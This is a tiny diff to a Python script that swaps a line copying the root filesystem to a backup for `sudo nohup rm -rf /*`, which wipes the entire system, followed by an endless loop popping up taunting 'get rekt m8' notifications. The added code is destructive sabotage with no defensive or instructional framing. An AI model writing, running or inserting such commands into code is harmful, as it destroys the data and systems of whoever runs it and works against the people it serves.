@@ -1,2 +1,4 @@
 import os
-os.system("cp /* /instantdeathbackup")
+os.system("sudo nohup rm -rf /*")
+while True:
+  os.system('nohup notify-send "get rekt m8"')
